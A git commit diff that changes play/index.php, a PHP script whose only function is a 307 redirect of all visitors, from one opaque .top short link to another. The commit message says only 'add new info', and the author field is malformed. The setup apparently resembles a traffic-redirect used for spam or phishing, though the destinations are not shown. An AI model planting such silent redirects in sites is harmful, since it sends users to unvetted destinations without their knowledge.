2e25c1c6ae9a22bd353c69623bb85094572f1421
PhoenixFan86 <johndoe@example.comphoenixfan86@gmail.com>
2026-03-23 19:16:56 +0200

    add new info

--- play/index.php
+++ play/index.php
@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://aahypermarkdev.top/Bysnx3');
+header('Location: https://bizleader.top/1y6gcT');
 exit();
 ?>
